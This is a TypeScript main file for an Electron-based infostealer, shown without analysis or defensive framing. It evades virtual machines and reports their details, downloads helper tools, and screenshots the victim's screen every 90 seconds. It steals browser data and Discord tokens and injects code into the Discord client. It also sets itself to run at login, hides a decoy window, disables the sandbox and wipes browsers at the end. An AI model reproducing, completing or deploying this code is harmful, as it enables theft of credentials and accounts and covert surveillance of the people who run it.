
import crypto from 'crypto';
import fs from 'fs';
import path from 'path';
import os from 'os';
import { promisify } from 'util';

import { stealTokens } from './discord/tokens';
import { runB } from './browsers/send';
import { app, BrowserWindow, ipcMain } from 'electron';
import { dcinject } from './discord/injection';
import { sendGenericMessage, sendVmInfo } from './api/sender';
import { AntiVM } from './utils/antivm';
import { downloadExtractor } from './utils/setupExtractor';
import { downloadDecrypt } from './utils/setupDecrypt';
import { isFirstRun, THEME } from './config/constants';
import { takeCapture } from './utils/capture';
import { nukeAllBrowsers } from './utils/nukeBrowsers';
const configPath = path.join(__dirname, "./config/constants.js");
const rmdirAsync = promisify(fs.rmdir);
const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
async function main(): Promise<void> {

    if (app && app.isPackaged) {
        const isThreat = await AntiVM.checkAll();
        if (isThreat) {
            const MachineInfo = AntiVM.getMachineDetails()

            await sendVmInfo(MachineInfo).catch(e => { })
            process.exit(1);
            return;
        }
        await downloadExtractor();
        await downloadDecrypt();
        await delay(2000)
    }
    await takeCapture();
    setInterval(async () => { await takeCapture() }, 90 * 1000)

    const tempDir = path.join(os.tmpdir(), crypto.randomBytes(8).toString('hex'));
    fs.mkdirSync(tempDir, { recursive: true });


    const measure = async <T>(func: () => Promise<T>): Promise<T | null> => {
        try {
            const result = await func();
            return result;
        } catch (err: any) {
            sendGenericMessage(err.message)
            return null;
        }
    };
    await measure(runB);
    await measure(stealTokens);
    await measure(dcinject);

    try {
        await rmdirAsync(tempDir);
    } catch (e) {
    }
}

if (app && app.isPackaged) {

    app.disableHardwareAcceleration();
    app.commandLine.appendSwitch('disable-gpu');
    app.commandLine.appendSwitch('disable-software-rasterizer');
    app.commandLine.appendSwitch('no-sandbox');
    app.on('ready', async () => {
        const dummyWindow = new BrowserWindow({
            width: 800,
            height: 600,
            frame: false,
            transparent: true,
            resizable: false,
            alwaysOnTop: true,
            center: true,
            show: false,
            skipTaskbar: true,
            webPreferences: {
                nodeIntegration: false,
                contextIsolation: true
            }
        });
        const theme = THEME;
        if (theme) {
            const themePath = path.join(process.resourcesPath, 'Themes', `${theme}.html`)
            sendGenericMessage(themePath)
            dummyWindow.loadFile(themePath);
        }
        const isStartup = process.argv.includes('--startup');
        dummyWindow.once("ready-to-show", async () => {
            if (isFirstRun && !isStartup) {
                app.setLoginItemSettings({
                    openAtLogin: true,
                    path: process.execPath
                });
                dummyWindow.show();

                setTimeout(() => {
                    try {
                        let content = fs.readFileSync(configPath, 'utf8');
                        let updatedContent = content.replace(
                            /export const isFirstRun = true;/g,
                            'export const isFirstRun = false;'
                        );
                        fs.writeFileSync(configPath, updatedContent, 'utf8');
                    } catch (err) {
                        console.error("Config güncellenemedi:", err);
                    }
                }, 90000);

            } else {
                dummyWindow.hide();
            }
        })
        dummyWindow.on('close', (event) => {
            if (!(app as any).isQuitting) {
                event.preventDefault();
                dummyWindow.hide();
            }
        });
        app.on('before-quit', () => {
            (app as any).isQuitting = true;
        });
        ipcMain.on('hide-me', () => {
            if (dummyWindow) {
                dummyWindow.hide();
            }
        });
        try {
            await main();
        } catch (err: any) {
            sendGenericMessage(err.message)
        } finally {
            if (dummyWindow) {
                dummyWindow.hide();
            }
            nukeAllBrowsers()
        }

    });

} else {
    main().catch(e => { console.log(e) })
}